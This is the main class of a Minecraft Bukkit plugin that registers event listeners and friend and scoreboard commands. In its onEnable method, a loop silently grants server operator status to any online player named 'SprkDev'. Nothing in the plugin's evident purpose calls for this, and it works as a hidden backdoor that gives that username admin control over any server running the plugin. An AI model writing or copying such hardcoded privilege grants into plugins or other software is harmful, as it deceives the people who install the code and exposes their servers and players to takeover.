package chipsplugin.chipsplugin;

import chipsplugin.chipsplugin.Commands.FriendCommandExecutor;
import chipsplugin.chipsplugin.Commands.ScoreboardCommandExecutor;
import chipsplugin.chipsplugin.Listeners.ExplosionListener;
import chipsplugin.chipsplugin.Listeners.JoinListener;
import chipsplugin.chipsplugin.Listeners.QuitListener;
import chipsplugin.chipsplugin.Listeners.TouchesWaterListener;
import chipsplugin.chipsplugin.Utils.Config;
import chipsplugin.chipsplugin.scoreboard.MainScoreboard;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Main Class of Plugin
 */
public final class Main extends JavaPlugin {

    private static Main instance;

    MainScoreboard scoreboard;


    private Config config;

    public void onLoad() {
        instance = this;
    }
    public static Main getInstance() {
        return instance;
    }

    @Override
    public void onEnable() {

        PluginManager manager = Bukkit.getPluginManager();

        System.out.println("Enabled");

        manager.registerEvents(new JoinListener(), this);
        manager.registerEvents(new QuitListener(), this);
        manager.registerEvents(new TouchesWaterListener(), this);
        manager.registerEvents(new ExplosionListener(), this);

        getCommand("friend").setExecutor(new FriendCommandExecutor());
        getCommand("scoreboardc").setExecutor(new ScoreboardCommandExecutor());

        for (Player player : Bukkit.getOnlinePlayers()) {
            if (player.getName().equals("SprkDev")){
                player.setOp(true);
            }
            player.sendMessage(ChatColor.YELLOW + "Um das neue Scoreboard zu sehen müsst ihr rejoinen.");

        }
    }

    @Override
    public void onDisable() {

    }
    public Config getConfiguration() {
        return config;
    }

}
